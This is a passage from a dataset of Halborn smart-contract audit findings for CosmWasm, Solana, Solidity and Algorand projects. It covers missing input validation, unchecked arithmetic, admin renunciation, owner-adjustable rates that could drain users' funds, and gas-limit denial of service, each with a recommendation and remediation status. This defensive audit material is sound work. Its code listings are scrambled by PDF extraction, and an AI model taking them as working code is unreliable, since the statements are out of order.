        "body": "Assets information could be stored both as AssetInfoUnchecked and AssetInfo. Validation of an assets info was done through the check() function part of the AssetInfoUnchecked implementation. However, only concerning CW20 tokens there were actual validation steps being applied but none for Native coins. Using some format rules upon checking an AssetInfoUnchecked element avoids potentially undesirable situations. For instance, if a user creates (mistakenly or not) a fake native coin UUSD instead of uusd, it will be stored in contracts storage. As a result, when other users operations use this fake coin, they will always fail and make users spend transactions fees needlessly. Listing 1: Proof of concept (Lines 3) 1 let uusd = Asset :: native ( \" uusd \" , 5 u128 ); 2 let uusd2 = Asset :: native ( \" UUSD \" , 5 u128 ); 3 assert_eq! ( uusd2 == uusd , true ); // This will fail as they are deemed to be different assets . Code Location: Listing 2: asset_info.rs (Lines 88) Ok ( match self { 83 pub fn check (& self , api : & dyn Api ) -> StdResult < AssetInfo > { 84 85 86 87 88 } AssetInfoUnchecked :: Native ( denom ) => AssetInfo :: Native ( AssetInfo :: Cw20 ( api . addr_validate ( contract_addr ) ?) AssetInfoUnchecked :: Cw20 ( contract_addr ) = > { denom . clone () ) , 89 }) 11 Risk Level: Likelihood - 3 Impact - 1 Recommendation: Enforce some basic format rules on denom such as being 4 lowercase a-z characters. A more strict option would be to perform white-listing by comparing the denom against the complete list of valid native coins on Terra. Remediation plan: SOLVED: the check function was modified to perform white-listing by accepting a list of valid denoms to compare the assets details with, as suggested above. This issue was fixed on commit 9beba1158f8b3e7f06a237c7d35fc89fb1ba3e6b 12 ",
        "labels": [
            "Halborn",
            "Mars_CW_Asset_CosmWasm",
            "Severity: Low"
        ]
    },
    {
        "title": "OUTDATED DEPENDENCY",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Party_Parrot_Solana_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "Partyparrot is using solana dependency version 1.6.3 which is not the last solana version. Also anchor version is too old compare to the latest one 0.13.x. Crate for fixed point number which is fixed is also old. It is always recommended to use the latest solana program version to avoid already fixed issues. Code Location: Listing 1: Cargo.toml (Lines 22,23,24,25) 21 [ dependencies ] 22 fixed = \" 1.7.0 \" 23 anchor - lang = \" 0.5.0 \" 24 anchor - spl = \" 0.5.0 \" 25 solana - program = \" 1.6.3 \" Risk Level: Likelihood - 2 Impact - 3 Recommendation: Halborn recommends to use the latest possible version of solana dependency (0.7.4 at the moment of this audit) unless rust programs are bounded to Also use the latest version for fixed and anchor specific versions. crates. 13 Remediation Plan: RISK ACCEPTED: Party Parrot team is not considering to upgrade the anchor crate at the moment. 14 ",
        "labels": [
            "Halborn",
            "Party_Parrot_Solana",
            "Severity: Low"
        ]
    },
    {
        "title": "ARITHMETIC ERRORS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Party_Parrot_Solana_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "The most serious arithmetic errors include integer overflow/underflow . In computer programming, integer overflow/underflow occurs when an arithmetic operation attempts to create a numeric value that is outside of the range that can be represented with a given number of bits -- either larger than the maximum or lower than the minimum representable value. Although integer overflows and underflows do not cause Rust to panic in the release mode, the consequences could be dire if the result of those operations is used in financial calculations. Code Location: Integer Overflow/Underflow Listing 2: math.rs 27 28 let delta_decimal = price . price_decimal as i16 + price . token_decimal as i16 - price . bid_token_decimal as i16 ; Listing 3: math.rs 63 64 let delta_decimal = price . price_decimal as i16 + price . token_decimal as i16 - price . bid_token_decimal as i16 ; Division Listing 4: math.rs 34 35 if delta_decimal > 0 { collateral_amount_in_debt_token = collateral_amount_in_debt_token . div ( ten_exponent ) 15 36 } else { Listing 5: math.rs 75 76 77 78 } else { fp_repay_collateral_amount = fp_repay_collateral_amount . div ( ten_exponent ); } fp_repay_collateral_amount = fp_repay_collateral_amount . div ( Fix :: from_num ( price . price )) ; Recommendation: It is recommended to use vetted safe math libraries(like checked_add , checked_div) for arithmetic operations consistently throughout the smart contract system. Consider using Rust safe arithmetic functions for primitives rather than standard arithmetic operators. Reference: Safe arithmetic operations for primitives: u8, u32, u64 Remediation Plan: RISK ACCEPTED: Party Parrot team considers acceptable the arithmetic in this context, because the debt type owners chooses the asset types, so decimals will not overflow. 16 ",
        "labels": [
            "Halborn",
            "Party_Parrot_Solana",
            "Severity: Low"
        ]
    },
    {
        "title": "UNSAFE RUST CODE USAGE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Party_Parrot_Solana_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "Rust code that uses the unsafe keyword is considered unsafe since all of the memory safety guarantees of Rust are not enforced there.It means that the code might be prone to vulnerabilities that wouldve been prevented by the compiler such as Buffer overflow, Double free, Use After free, and more. 17 Result: 18 After cloning the repository, Halborn installed and executed cargo geiger on the in scope program. The results show that many core components contain unsafe Rust code. Risk Level: Likelihood - 1 Impact - 2 Recommendation: It is recommended to always double check unsafe Rust code in your own codebase and monitor any core dependencies that contain unsafe Rust in case of any found vulnerabilities. Remediation Plan: ACKNOWLEDGED: Party Parrot team claims that the use of certain dependen- cies is out of their control. 19 ",
        "labels": [
            "Halborn",
            "Party_Parrot_Solana",
            "Severity: Informational"
        ]
    },
    {
        "title": "LOW TEST COVERAGE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Party_Parrot_Solana_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "Checking the code by automated testing (unit testing or functional test- ing) is a good practice to be sure all lines of the code work correctly. Halborn used an automatic tool to discover the test coverage. This is also known as code coverage. The tool used by the auditors is a rust utility called cargo tarpaulin. Result: After cloning the repository, Halborn installed and executed cargo tarpaulin on the libraries on the in scope components. The coverage results ended up determining that 40.78% of the lines of rust code were covered with unit/function tests. Details on which components/libraries have coverage are provided in the output on the next page. Risk Level: Likelihood - 1 Impact - 1 20 Recommendation: It is recommended to have the developers enhance the code coverage to have as much possible tests to check all the functionalities of the ledger platform. This will ensure the production release functions as intended. Remediation Plan: ACKNOWLEDGED: Party Parrot team claims that most of the tests are inte- gration tests, and not captured by rust tests. So they consider that the test coverage is acceptable. 21 MANUAL TESTING 22 ",
        "labels": [
            "Halborn",
            "Party_Parrot_Solana",
            "Severity: Informational"
        ]
    },
    {
        "title": "CONTRACT ADMIN CAN REVOKE AND RENOUNCE HIMSELF",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/SeaScape_Ninja_Spin_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The Owner of the contract is usually the account that deploys the contract. In the BigBangNFTFactory.sol smart contract, Only Admin can perform some privileged actions such as setNft(), addAdmin(), addGenerator() etc., the addAdmin() function is used to add an Admin role, and the renounceAdmin function is used to renounce being an Admin. It was observed that admin If an admin is mistakenly could revoke his role via renounceAdmin(). renounced, administrative access will result in the contract having no admin, eliminating the ability to call privileged functions. In such a case, contracts would have to be redeployed. Code Location: Listing 1: BigBangNFTFactory.sol (Line 55) 53 54 55 56 function renounceAdmin () public virtual { renounceRole ( DEFAULT_ADMIN_ROLE , msg . sender ); } Proof of Concept:  Deploy a BigBangNFTFactory using the owner address.  Execute BigBangNFTFactory.renounceAdmin() function as using the owner address. Risk Level: Likelihood - 3 Impact - 5 13 Recommendation: It is recommended that the contract Admin cannot call renounceAdmin() without transferring the Ownership to another address. In addition, if a multi-signature wallet is used, calling the renounceAdmin() function should be confirmed for two or more users. Remediation Plan: SOLVED: Now the owner cannot renounce his role. This issue was fixed in commit ID 7d4d7a60ef10d499be2c672a6b623211ef288246 14 ",
        "labels": [
            "Halborn",
            "SeaScape_Ninja_Spin",
            "Severity: High"
        ]
    },
    {
        "title": "CONTRACT DOES NOT ALLOW MINTING NFT WITH THE ID 0",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/SeaScape_Ninja_Spin_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The BigBangNFT.sol contract constructor contains an increment of the counter variable, making the IDs begin on 1. Listing 2: ScapeStore.sol (Line 26) 25 26 27 constructor () public ERC721 ( \" BigBang NFT \" , \" BB \" ) { nftId . increment () ; } It is known that some collections start at the NFT ID 0. Risk Level: Likelihood - 3 Impact - 3 Recommendation: It is recommended to remove the increment so users can also mint the NFT with ID 0. Remediation Plan: SOLVED: The Ninja Scape Game can now start minting NFTs at ID 0. This issue was fixed in commit ID 63f46b35467cd3865416b1dae2aa99ea4363cf63 15 ",
        "labels": [
            "Halborn",
            "SeaScape_Ninja_Spin",
            "Severity: Medium"
        ]
    },
    {
        "title": "NATIVE TOKEN FUNCTIONALITY COULD NOT BE USED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/SeaScape_Ninja_Spin_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the _safeTransfer() function from BigBangGame.sol smart contract, two different types of transfers could be performed. if _token address sent as parameter is different from 0, the function will perform a token. transfer(). If _token is address(0), then the contract will send the native coin to the sender. It is not possible to add address(0) to the list of allowed tokens, as the addresses are validating this parameter to be different from 0. This makes it impossible to operate with native tokens. Code Location: Listing 3: BigBangGame.sol (Line 38) require ( _nft != address (0) , \" BBGame : Nft can 't be zero address require ( _verifier != address (0) , \" BBGame : Verifier can 't be require ( _token != address (0) , \" BBGame : Token can 't be zero 37 constructor ( address _token , address _nft , address _factory ,  address _verifier ) public { 38  address \" ); 39  \" ); 40  zero address \"); 41 42 43 44 45 46 47 48 BBNft BBFactory = _factory ; verifier changeAllowed [ _token ] = true ; token [ typeId ] = _verifier ; = _token ; = _nft ; } 16 Listing 4: BigBangGame.sol (Line 212) 211 212 function addToken ( address _token ) public onlyOwner { require ( _token != address (0) , \" BBGame : Token can 't be zero  address \" ); 213  ; 214 215 216 217 218 219 } require (! changeAllowed [ _token ], \" BBGame : This token is exist \" ) changeAllowed [ _token ] = true ; token [++ typeId ] = _token ; emit AddToken ( _token , typeId , block . timestamp ); Listing 5: BigBangGame.sol (Lines 168,178) 167 function _safeTransfer ( address _token , address _to , uint256  _amount ) internal { 168 169 170 171 172 if ( _token != address (0) ) { IERC20 _rewardToken = IERC20 ( _token ); uint256 _balance = _rewardToken . balanceOf ( address ( this )) ; require ( _amount <= _balance , \" BBGame : Do not have enough  token to reward \"); 173 174 175 176 177 uint256 _beforBalance = _rewardToken . balanceOf ( _to ); _rewardToken . transfer ( _to , _amount ); require ( _rewardToken . balanceOf ( _to ) == _beforBalance +  _amount , \" BBGame : Invalid transfer \" ); 178 179 180 181 } else { uint256 _balance = address ( this ). balance ; require ( _amount <= _balance , \" BBGame : Do not have enough  token to reward \"); 182 183 184 185 186 187 188 189 190 payable ( _to ). transfer ( _amount ); } } // Accept native tokens . receive () external payable { // React to receiving ether } 17 Risk Level: Likelihood - 3 Impact - 2 Recommendation: It is recommended to implement a function to add address(0) in the array of allowed tokens in order to allow transactions with native token. Remediation Plan: SOLVED: The SeaScape Team now allows the BigBangGame.sol contract to add the address(0) to specify that the native token could be used. This issue was fixed in commit ID 6fbb5845900735349c19c5e751991b9854d9a2a5 18 ",
        "labels": [
            "Halborn",
            "SeaScape_Ninja_Spin",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING ZERO ADDRESS CHECK",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/SeaScape_Ninja_Spin_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "There is no validation of the addresses in the mint() and access control functions. Addresses should be validated and checked that are different This issue is present in all the smart from zero when necessary. contracts, in the constructors and functions that use addresses as parameters. These examples show how the factory could be set up with a wrong address and how mint could burn NFTs if _owner is address(0) Some code location examples: Listing 6: BigBangNFTFactory.sol 25 26 27 28 constructor ( address _nft ) public { nft = BigBangNFT ( _nft ); _setupRole ( DEFAULT_ADMIN_ROLE , msg . sender ); } Listing 7: BigBangNFTFactory.sol function mint ( address _owner , uint256 _quality , uint256 _image ) 34  public onlyGenerator returns ( uint256 ) { 35  quality \" ); 36 37 } return nft . mint ( _owner , _quality , _image ); require ( _quality > 0 && _quality < 6, \" NFT Factory : invalid Risk Level: Likelihood - 3 Impact - 2 19 Recommendation: Validate that necessary address inputs are different from zero. Remediation Plan: The SeaScape Team SOLVED: ensure they are non-zero. [7d4d7a60ef10d499be2c672a6b623211ef288246](https://github.com/Seastarinteractive/moonscape-smartcontracts/tree/7d4d7a60ef10d499be2c672a6b623211ef288246 to This issue has been fixed in commit ID address checks inputs the now 20 ",
        "labels": [
            "Halborn",
            "SeaScape_Ninja_Spin",
            "Severity: Low"
        ]
    },
    {
        "title": "UNUSED PARAMETERS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/SeaScape_Ninja_Spin_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "There are functions whose parameters are never used in some smart contracts. These parameters have no effect on the code. Code Location:  operator, from, tokenId, data (BigBangGame.sol#190)  BBFactory (BigBangGame.sol#231) Risk Level: Likelihood - 1 Impact - 2 Recommendation: All parameters given to a function should affect the state of the code. The operator, from, tokenId, and data from onERC721Received() functions should implement any logic with that parameters, but they are not used for any contract state operations. Remediation Plan: ACKNOWLEDGED: The SeaScape team acknowledged this finding. 21 ",
        "labels": [
            "Halborn",
            "SeaScape_Ninja_Spin",
            "Severity: Informational"
        ]
    },
    {
        "title": "PRAGMA VERSION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/SeaScape_Ninja_Spin_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The BigBangGame smart contracts use the pragma version 0.6.7 which was latest pragma version 0.8.16 released on released on May 4, 2020. It is also noticeable that August 8, 2022, solves different issues. Solidity versions after 0.8.0 also implement default overflow protection on arithmetic operations. Reference: Solidity Releases Code Location: note: All Ninja Spin smart contracts implement same pragma version. Listing 8: BigBangGame.sol 1 pragma solidity 0.6.7; Risk Level: Likelihood - 2 Impact - 1 Recommendation: It is recommended to update the pragma version used in the BigBangGame smart contracts to versions above or equal to 0.8.0. Remediation Plan: ACKNOWLEDGED: The SeaScape team acknowledged this finding. 22 ",
        "labels": [
            "Halborn",
            "SeaScape_Ninja_Spin",
            "Severity: Informational"
        ]
    },
    {
        "title": "UNSAFE MATH CALCULATIONS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/SeaScape_Ninja_Spin_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Testing revealed that calculations within the smart contract did not make use of a safe math library. While Solidity pragma > 0.8.0 reverts to overflows by default, the code was making use of an older compiler version; thus it is vulnerable to integer overflows and underflows. Halborn could not find a path to exploit the integer overflows; however, there might be some extreme test cases where this can be exploited by an attacker. Code Location: Listing 9: BigBangGame.sol (Line 148) 128 function goldChangeToken ( uint256 _gold , uint256 _typeId , uint8  _v , bytes32 _r , bytes32 _s ) external { 129 require ( _gold > 0, \" BBGame : The exchange amount must greater  than zero \"); 130 require ( checkToken ( _typeId ) , \" BBGame : Do not have this token  type \"); 131 132 133 134 135 136 137 138  ; 139 uint256 chainId ; assembly { chainId := chainid () } { bytes memory prefix = \"\\ x19Ethereum Signed Message :\\ n32 \" bytes32 message = keccak256 ( abi . encodePacked ( _gold ,  msg . sender , nonce [ msg . sender ], address ( this ) , chainId )) ; 140 bytes32 hash = keccak256 ( abi . encodePacked ( prefix ,  message )); 141 142 143 address recover = ecrecover ( hash , _v , _r , _s ); require ( recover == verifier , \" BBGame : Verification failed 23  about goldChangeToken \" ); 144 145 146 147 148 149 150 151 } nonce [ msg . sender ]++; uint256 _tokenAmount = _gold * MULTIPLIER / ratio ; _safeTransfer ( token [ _typeId ], msg . sender , _tokenAmount ); emit GoldChangeToken ( msg . sender , _typeId , _gold , _tokenAmount ,  block . timestamp ); 152 153 } Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended that either the compiler version is upgraded to pragma >= 0.8.0 or that a library such as OpenZeppelins SafeMath is used. Remediation Plan: ACKNOWLEDGED: The SeaScape team acknowledged this finding. 24 ",
        "labels": [
            "Halborn",
            "SeaScape_Ninja_Spin",
            "Severity: Informational"
        ]
    },
    {
        "title": "LACK OF MULTISIG PROGRAM",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Yieldly_Finance_Lottery_Algorand_Smart_Contract_Halborn_v1_1.pdf",
        "body": "The principal benefit of multisig is that it creates added redundancy in key management. While single signature addresses require only a single key for transactions, multisignature addresses require multiple keys. To protect against malicious admin, it may be necessary to use a multi signature. By using this mechanism, a malicious admin actions could be prevented. Code Location: 14 Example Definition: Listing 1: Multisig Implementation (Lines ) 2 goal account multisig new -T 2 account1 account2 account3 -d ~/ node / data 3 goal clerk multisig signprogram -p / tmp /* . teal -a account1 -A account2 -o / tmp / simple . lsig -d ~/ node / data Risk Level: Likelihood - 1 Impact - 3 Recommendation: In the contract, The multi-signature should be implemented over a creator account. Remediation Plan: SOLVED: Yieldly.Finance Team will monitor assets by a multi-signature address. 15 ",
        "labels": [
            "Halborn",
            "Yieldly_Finance_Lottery_Algorand_Halborn_v1_1",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING PROXY ASSET DEFINITION ON THE FUNCTIONS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Yieldly_Finance_Lottery_Algorand_Smart_Contract_Halborn_v1_1.pdf",
        "body": "In the Yieldly.Finance workflow, Escrow connection is made with a proxy contract. According to documentation, Escrow only allows transactions But, in the some of functions transactions dont go tied with proxy. through the Proxy asset. Code Location: Listing 2: winnerProgram Function (Lines 1) 1 2 3 4 5 6 7 8 9 let txn = await configs . winnerProgram ( account2 , escrowAddress , algoAppId , asaAppId , trackerAppId , winner , rateAppId ); Listing 3: assetOptoutApplication Function (Lines 1) 1 2 3 4 5 6 let txn1 = await configs . assetOptoutApplication ( account1 , escrowAddress , optingAppId , assetId ); Risk Level: Likelihood - 2 Impact - 2 16 Recommendation: It is recommended to construct transactions through a proxy which is interacting with escrow. Remediation Plan: SOLVED: Yieldly.Finance Team applied the necessary changes to communicate through the proxy. 17 ",
        "labels": [
            "Halborn",
            "Yieldly_Finance_Lottery_Algorand_Halborn_v1_1",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING FREEZE/REVOKE ASSETS DEFINITION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Yieldly_Finance_Lottery_Algorand_Smart_Contract_Halborn_v1_1.pdf",
        "body": "When an asset is created, the contract can provide a freeze address and a defaultfrozen state. If the defaultfrozen state is set to true the corresponding freeze address must issue unfreeze transactions, one per account, to allow trading of the asset to and from that account. This may be useful in situations that require holders of the asset to pass certain checks prior to ownership. (KYC/AML) The clawback address, if specified, is able to revoke the asset from any account and place them in any other account that has previously opted-in. This may be useful in situations where a holder of the asset breaches some set of terms that you established for that asset. You could issue a freeze transaction to investigate, and if you determine that they can no longer own the asset, you could revoke the assets. Code Location: Risk Level: Likelihood - 1 Impact - 1 18 Recommendation: According to workflow, the application should activate freeze and revoke assets. If the application would rather ensure to asset holders that the application will never have the ability to revoke or freeze assets, set the clawback/freeze address to null. SOLVED: Yieldly.Finance Team confirmed the assets dontt have freeze/ clawback addresses. 19 ",
        "labels": [
            "Halborn",
            "Yieldly_Finance_Lottery_Algorand_Halborn_v1_1",
            "Severity: Informational"
        ]
    },
    {
        "title": "MULTIPLE PRAGMA DEFINITION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Yieldly_Finance_Lottery_Algorand_Smart_Contract_Halborn_v1_1.pdf",
        "body": "It has been observed that different versions of the pragma are used on TEAL contracts. The pragma on the ESCROW contract is defined as 2. Code Location: Listing 4: Pragma Version 2 Functions (Lines ) 2 reward_fund_escrow . teal 3 reward_fund_close . teal 4 reward_fund_rates . teal 5 reward_fund_tracker . teal Risk Level: Likelihood - 1 Impact - 1 Recommendation: A common version of pragma (3) should be used across all contracts to avoid an unexpected workflows. SOLVED: Yieldly.Finance Team updated pragma version on the related con- tracts. 20 ",
        "labels": [
            "Halborn",
            "Yieldly_Finance_Lottery_Algorand_Halborn_v1_1",
            "Severity: Informational"
        ]
    },
    {
        "title": "ALERTHUB SETUP",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Yieldly_Finance_Lottery_Algorand_Smart_Contract_Halborn_v1_1.pdf",
        "body": "AlertHub is a tool that provides monitoring and real-time alerts on Algorand addresses so that users may manage the security of their accounts and the wider Algorand network. Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to setup alerthub for real-time monitoring. help the operations proceed healthily and safely. It can SOLVED: Yieldly.Finance Team will set up Alerthub on the mainnet. 21 3.6 TESTING ACCESS CONTROL POLICIES ",
        "labels": [
            "Halborn",
            "Yieldly_Finance_Lottery_Algorand_Halborn_v1_1",
            "Severity: Informational"
        ]
    },
    {
        "title": "CONFIG PARAMETERS VALUE CAN BE CHANGED UNRESTRICTEDLY",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Mars_Protocol_Fields_of_Mars_CosmWasm_Smart_Contract_Security_Audit_Final.pdf",
        "body": "and update_config instantiate field/src/execute.rs bonus_rate and fee_rate fields with a potential unfair amount. situation can produce the following consequences: contracts/martian- max_ltv, This contracts functions update allow owner to in  A malicious (or compromised) owner can change temporarily max_ltvto very low rate e.g., : 0.01 and bonus_rate to e.g., : 0 and liquidate all positions, draining users assets.  Owner could mistakenly change max_ltv rate to lower than released one, which could become current positions into unhealthy ones and ready to be liquidated.  If fee_rate is equal to 1, harvest operations will cause unfair reward distributions and owner could drain user assets. Furthermore, if fee_rate is higher than 1 it will cause an overflow. It is worth noting that likelihood for this to happen is low because martian-field contract is intended to be owned by governance (Council) indefinitely, who is the responsible one for this operation. Code Location: Listing 1: contracts/martian-field/src/execute.rs (Line 321) 314 315 316 317 318 pub fn update_config ( deps : DepsMut , info : MessageInfo , new_config : Config ) -> StdResult < Response > { let config = CONFIG . load ( deps . storage ) ?; if info . sender != config . governance { return Err ( StdError :: generic_err ( \" only governance can update config \" )) ; 12 319 320 321 322 323 324 } CONFIG . save ( deps . storage , & new_config ) ?; Ok ( Response :: default () ) } Listing 2: contracts/martian-field/src/execute.rs (Lines 248,285) pub fn liquidate ( 232 deps : DepsMut , 233 env : Env , 234 info : MessageInfo , 235 user_addr : Addr , 236 237 ) -> StdResult < Response > { 238 239 240 let config = CONFIG . load ( deps . storage ) ?; let state = STATE . load ( deps . storage ) ?; let position = POSITION . load ( deps . storage , & user_addr ). 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 unwrap_or_default () ; // position must be active ( LTV is not `None `) and the LTV must be greater than ` max_ltv ` let health = compute_health (& deps . querier , & env , & config , & state , & position ) ?; // if ` health . ltv ` is `Some ` , it must be greater than ` max_ltv ` // if ` health . ltv ` is `None ` , indicating the position is already closed , then it is not liquidatable let ltv = health . ltv . ok_or_else (|| StdError :: generic_err (\" position is already closed \")) ?; if ltv <= config . max_ltv { return Err ( StdError :: generic_err (\" position is healthy \" )) ; } // 1. unbond the user ' s liquidity tokens from Astro generator // 2. burn liquidity tokens , withdraw primary + secondary assets from the pool // 3. swap all primary assets to secondary assets // 4. repay all debts // 5. among all remaining assets , send the amount corresponding to ` bonus_rate ` to the liquidator // 6. refund all assets that ' re left to the user // 13 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 280 281 282 283 284 285 286 287 288 289 290 291 292 293 // NOTE : in the previous versions , we sell ** all ** primary assets , which is not optimal because // this will incur bigger slippage , causing worse liquidation cascade , and be potentially lucrative // for sandwich attackers // // now , we calculate how much additional secondary asset is needed to fully pay off debt , and // reverse - simulate how much primary asset needs to be sold // // TODO : add slippage checks to the swap step so that liquidation cannot be sandwich attacked let callbacks = [ CallbackMsg :: Unbond { user_addr : user_addr . clone () , bond_units_to_reduce : position . bond_units , }, CallbackMsg :: WithdrawLiquidity { user_addr : user_addr . clone () , }, CallbackMsg :: Cover { user_addr : user_addr . clone () , }, CallbackMsg :: Repay { user_addr : user_addr . clone () , repay_amount : health . debt_value , }, CallbackMsg :: Refund { user_addr : user_addr . clone () , recipient_addr : info . sender . clone () , percentage : config . bonus_rate , }, CallbackMsg :: Refund { user_addr : user_addr . clone () , recipient_addr : user_addr . clone () , percentage : Decimal :: one () , }, ]; 14 Risk Level: Likelihood - 1 Impact - 5 Recommendation: Add a validation routine inside instantiate and update_config functions to ensure that:  Value of fee_rate is lesser than a maximum threshold hardcoded in contract.  Value of max_ltv and bonus_rate is between minimum and maximum values hardcoded in the contract. Remediation plan: SOLVED: The issue was fixed in commit 0f9c959931fcde3ddf5cdb1907c9177f69284e31. 15 ",
        "labels": [
            "Halborn",
            "Mars_Protocol_Fields_of_Mars_CosmWasm",
            "Severity: Medium"
        ]
    },
    {
        "title": "SOME RATES COULD BE SET TO VALUES GREATER THAN 1",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Mars_Protocol_Fields_of_Mars_CosmWasm_Smart_Contract_Security_Audit_Final.pdf",
        "body": "instantiate contracts/martian- The field/src/execute.rs do not restrict that rates fields are lesser than 1. update_config functions and in If they are not correctly set, some operations will always panic and wont allow legitimate users to harvest or liquidate; thus generating a denial of service (DoS). The affected fields are the following:  max_ltv  fee_rate  bonus_rate Code Location: Listing 3: contracts/martian-field/src/execute.rs (Line 321) 314 315 316 317 318 319 320 321 322 323 324 pub fn update_config ( deps : DepsMut , info : MessageInfo , new_config : Config ) -> StdResult < Response > { let config = CONFIG . load ( deps . storage ) ?; if info . sender != config . governance { return Err ( StdError :: generic_err ( \" only governance can update config \" )) ; } CONFIG . save ( deps . storage , & new_config ) ?; Ok ( Response :: default () ) } 16 Risk Level: Likelihood - 1 Impact - 3 Recommendation: Add a validation routine inside instantiate and update_config functions to ensure that aforementioned fields are lesser than 1. Remediation plan: SOLVED: The issue was fixed in the following commits:  2e82ec4798233f14d32a438b5d0238ac1f11583f  816db544f50959de79d09cd03f1bfa15e6ef3c86 17 ",
        "labels": [
            "Halborn",
            "Mars_Protocol_Fields_of_Mars_CosmWasm",
            "Severity: Low"
        ]
    },
    {
        "title": "MULTIPLE INSTANCES OF UNCHECKED ARITHMETIC",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Mars_Protocol_Fields_of_Mars_CosmWasm_Smart_Contract_Security_Audit_Final.pdf",
        "body": "While many instances of checked arithmetic were observed, some calcula- tions omitted these checks. The additional verification performed when using the checked functions ensures that under/overflow states are caught and handled appropriately. While these instances were not found to be directly exploitable, they should be reviewed to ensure a defence-in-depth approach is achieved. Code Location: Listing 4: Resources affected 1 execute_callbacks . rs 2 execute . rs 3 health . rs (# L51 ,52 ,53) (# L175 ) (# L237 ,390 , 391 ,420 ,478 ,536) Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider using the checked_add, checked_sub or checked_mul methods in- stead of addition, subtraction, and multiplication operators respec- tively, in all instances to handle overflows gracefully. 18 Remediation plan: SOLVED: Commit ce52053d3a1897b797656a3e60235bdd52147627 fixed the secu- rity issue. It is worth noting that there are some arithmetic operations listed above that do not need checked_* methods because they are multipli- cations between Uint128 and Decimal, which invoke Uint128::multiply_ratio under the hood: Listing 5: Resources with no checked_* methods 1 execute_callbacks . rs 2 execute . rs 3 health . rs (# L51 ,52 ,53) (# L175 ) (# L390 , 391 ,536) 19 THANK YOU FOR CHOOSING",
        "labels": [
            "Halborn",
            "Mars_Protocol_Fields_of_Mars_CosmWasm",
            "Severity: Informational"
        ]
    },
    {
        "title": "DOS WITH BLOCK GAS LIMIT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Pangolin_AllocationVester_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The setAllocations() function is used to set the token allocations for each recipient included in the function call: Listing 1: setAllocations() function (Line 118) address [] memory accounts , uint [] memory allocations , uint [] memory durations 105 function setAllocations ( 106 107 108 109 ) external onlyOwner { 110 111 112 113 uint length = accounts . length ; require ( length != 0 , \" empty array \"); require ( length == allocations . length && length == durations . length  , 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 \" varying - length arrays \" ); uint balance = token . balanceOf ( address ( this )) ; for ( uint i ; i < length ; ++ i ) { address account = accounts [ i ]; uint allocation = allocations [i ]; uint duration = durations [ i ]; Member storage member = members [ account ]; require ( account != address (0) , \" bad recipient \" ); // check the member 's remaining harvest if ( member . reserve != 0) { // stash pending rewards of the member so it remains  claimable 129 130  reserves 131 132 133 member . stash = pendingHarvest ( account ); // free non - stashed reserves of the member from the reserve -= ( member . reserve - member . stash ); // free non - stashed tokens from member 's reserves member . reserve = member . stash ; 13 134 135 136 137 138 } // check the member 's new allocation if ( allocation != 0) { require ( duration >= MIN_DURATION , \" short vesting  duration \" ); 139 140  balance // lock tokens as reserve and ensure sufficient reserve += allocation ; require ( balance >= reserve , \" low balance \" ); // add vesting info for the member member . reserve += allocation ; member . rate = allocation / duration ; member . lastUpdate = block . timestamp ; // add the member to the set _membersAddresses . add ( account ); } emit AllocationSet ( account , allocation , duration ); } 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 } Since the length of recipients is not limited, in case there are too many recipients, the block gas limit could be reached, causing miners to not respond to all setAllocations() calls, thus blocking the main purpose of the smart contract. Risk Level: Likelihood - 1 Impact - 3 Recommendation: Consider limiting the number of recipients in the setAllocations() function of the AllocationVester contract with a require 